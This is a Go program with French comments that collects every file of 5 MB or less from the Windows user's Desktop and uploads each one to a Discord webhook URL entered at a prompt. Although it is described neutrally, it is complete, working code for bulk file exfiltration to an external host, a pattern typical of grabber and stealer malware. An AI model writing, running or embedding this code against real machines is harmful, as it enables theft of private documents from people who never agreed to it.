// Ce programme en Go envoie les fichiers présents sur le bureau de l'utilisateur Windows
// vers un webhook Discord spécifié par l'utilisateur. Seuls les fichiers de taille inférieure
// ou égale à 5 Mo sont envoyés. Le programme parcourt chaque fichier, vérifie sa taille,
// et s'il est dans la limite, il l'envoie au webhook sous forme de pièce jointe.

package main

import (
    "bufio"
    "bytes"
    "fmt"
    "io/ioutil"
    "mime/multipart"
    "net/http"
    "os"
    "path/filepath"
)

// Définition de la taille maximale des fichiers en octets (5 Mo)
const maxFileSize = 5 * 1024 * 1024

func main() {
    // Demande à l'utilisateur l'URL du webhook Discord
    fmt.Print("Veuillez entrer l'URL du webhook Discord : ")
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan() // Lit l'entrée utilisateur
    webhookURL := scanner.Text()

    // Construit le chemin vers le bureau de l'utilisateur courant en utilisant la variable d'environnement USERPROFILE
    desktopPath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")

    // Récupère la liste des fichiers présents dans le répertoire du bureau
    files, err := ioutil.ReadDir(desktopPath)
    if err != nil {
        fmt.Println("Erreur lors de la lecture du bureau:", err)
        return
    }

    // Boucle sur chaque fichier trouvé sur le bureau
    for _, file := range files {
        // Vérifie que l'élément est un fichier (pas un dossier) et qu'il est dans la limite de taille
        if !file.IsDir() && file.Size() <= maxFileSize {
            // Construit le chemin complet vers le fichier
            filePath := filepath.Join(desktopPath, file.Name())

            // Appelle la fonction pour envoyer le fichier au webhook Discord
            err := sendFileToDiscord(webhookURL, filePath, file.Name())
            if err != nil {
                // Affiche un message d'erreur si l'envoi échoue
                fmt.Printf("Erreur d'envoi du fichier %s : %v\n", file.Name(), err)
            } else {
                // Affiche un message de succès si le fichier est envoyé correctement
                fmt.Printf("Fichier %s envoyé avec succès\n", file.Name())
            }
        } else if file.Size() > maxFileSize {
            // Si le fichier dépasse la taille maximale, il est ignoré et un message est affiché
            fmt.Printf("Fichier %s ignoré (taille supérieure à 5 Mo)\n", file.Name())
        }
    }
}

// Fonction qui envoie un fichier spécifique au webhook Discord
func sendFileToDiscord(webhookURL, filePath, fileName string) error {
    // Ouvre le fichier à envoyer
    file, err := os.Open(filePath)
    if err != nil {
        return fmt.Errorf("impossible d'ouvrir le fichier : %w", err)
    }
    defer file.Close() // Assure la fermeture du fichier après utilisation

    // Lit le contenu du fichier pour le transmettre dans la requête HTTP
    fileContents, err := ioutil.ReadAll(file)
    if err != nil {
        return fmt.Errorf("impossible de lire le fichier : %w", err)
    }

    // Prépare le corps de la requête HTTP en multipart (nécessaire pour Discord)
    body := &bytes.Buffer{}
    writer := multipart.NewWriter(body)

    // Crée une partie "file" dans le formulaire multipart pour y placer le fichier
    part, err := writer.CreateFormFile("file", fileName)
    if err != nil {
        return fmt.Errorf("erreur lors de la création de la requête multipart : %w", err)
    }

    // Écrit le contenu du fichier dans la partie du formulaire
    _, err = part.Write(fileContents)
    if err != nil {
        return fmt.Errorf("erreur d'écriture dans la requête multipart : %w", err)
    }

    // Finalise la construction du formulaire multipart
    writer.Close()

    // Crée une requête POST pour envoyer le fichier au webhook Discord
    req, err := http.NewRequest("POST", webhookURL, body)
    if err != nil {
        return fmt.Errorf("erreur de création de la requête HTTP : %w", err)
    }
    // Déclare le type de contenu comme multipart pour que Discord accepte la requête
    req.Header.Set("Content-Type", writer.FormDataContentType())

    // Envoie la requête HTTP au webhook Discord
    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return fmt.Errorf("erreur d'envoi de la requête : %w", err)
    }
    defer resp.Body.Close() // Assure la fermeture de la réponse après traitement

    // Vérifie le statut de la réponse pour s'assurer que Discord a accepté le fichier
    if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
        return fmt.Errorf("Discord a renvoyé une erreur : %d", resp.StatusCode)
    }

    // Retourne nil si tout s'est bien passé (pas d'erreur)
    return nil
}
